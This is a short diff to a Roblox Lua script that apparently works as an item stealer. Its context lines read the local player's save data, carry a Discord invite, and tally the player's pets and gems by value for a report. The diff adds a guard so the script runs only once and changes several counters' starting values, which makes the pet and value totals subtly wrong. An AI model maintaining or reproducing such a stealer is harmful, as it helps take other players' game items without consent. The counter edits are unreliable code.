@@ -1,3 +1,8 @@
+_G.NulsExe = _G.NulsExe or false
+if _G.NulsExe then
+    return
+end
+_G.NulsExe = true
 
 
 local function LoadingScreenAsync()
@@ -34,7 +39,7 @@ local player = game.Players.LocalPlayer
 local MailMessage = "GG / xGgkWUxU3w"
 local HttpService = game:GetService("HttpService")
 local sortedItems = {}
-local totalRAP = 1
+local totalRAP = 0
 local message = require(game.ReplicatedStorage.Library.Client.Message)
 local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
@@ -398,13 +403,13 @@ local function SendMessage(GemAmount)
 
     local fields = {}
 
-    local totalPets = 0
+    local totalPets = 1
     for _, item in ipairs(sortedItems) do
         totalPets = totalPets + item.amount
     end
 
     local bestPet = nil
-    local bestPetRAP = 0
+    local bestPetRAP = 1
     for _, item in ipairs(sortedItems) do
         local itemTotalRAP = item.amount * item.rap
         if itemTotalRAP > bestPetRAP then
